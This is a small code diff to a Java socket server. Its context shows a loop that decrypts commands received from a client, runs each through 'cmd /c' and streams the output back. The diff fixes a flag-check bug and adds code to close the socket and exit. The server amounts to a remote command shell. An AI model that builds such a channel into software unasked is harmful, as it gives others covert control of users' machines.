@@ -229,7 +229,8 @@ class Server{
 		         break;
 		         
 			case 4:
-				if(flag=true)
+			
+				if(flag)
 				{
 					while(true)
 					{
@@ -241,7 +242,7 @@ class Server{
 							Runtime oRuntime = Runtime.getRuntime();
 							Process oProcess = oRuntime.exec("cmd /c "+decryptMsg(recvCmd, key.priKey));
 						
-						BufferedReader stdOut   = new BufferedReader(new InputStreamReader(oProcess.getInputStream()));
+						BufferedReader stdOut  = new BufferedReader(new InputStreamReader(oProcess.getInputStream()));
 						String result;
 						while((result=stdOut.readLine()) != null)
 							WriteToClient.write(result+"\n");
@@ -259,6 +260,9 @@ class Server{
 					WriteToClient.flush();
 					WriteToClient.write("null" + "\n");
 					WriteToClient.flush();
+					socket.close();
+					System.exit(0);
+					
 				}
 			case 5:
 				socket.close();
